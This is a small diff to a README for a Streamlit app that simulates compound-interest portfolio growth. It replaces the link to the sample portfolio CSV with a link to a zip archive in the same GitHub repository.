@@ -46,7 +46,7 @@ A Streamlit web app that simulates long-term investment growth using compound in
 ## Sample Portfolio CSV
 
 Use this file to test the app:  
-[Download portfolio.csv](https://raw.githubusercontent.com/JorgeF123/portfolio-growth-simulator/main/data/portfolio.csv)
+[Download sample CSV](https://raw.githubusercontent.com/JorgeF123/portfolio-growth-simulator/main/portfolio-sample.zip)
 
 
 ---
